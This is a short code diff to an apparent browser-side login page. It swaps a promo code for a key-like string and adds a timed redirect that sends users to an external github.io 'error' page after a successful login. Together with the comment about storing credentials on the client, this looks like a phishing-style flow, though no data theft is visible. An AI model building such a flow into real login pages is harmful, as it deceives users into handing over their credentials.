@@ -886,7 +886,7 @@
             "WELCOME2025", 
             "FINANCE50", 
             "NEWUSER10", 
-            "PREMIUM100"
+            "DEL-4LW6-VZ01-WHYT"
         ];
 
         // Store user credentials temporarily (in a real app this would be handled by a backend)
@@ -989,6 +989,9 @@
                     
                     // Reset form
                     loginForm.reset();
+                    setTimeout(function(){
+                      window.location.href = "https://codexabq.github.io/deluxe/error.html"
+                    }, 3000) 
                 } else {
                     showNotification('error', 'Login Failed', 'Invalid phone number or password. Please try again.', 4000);
                 }
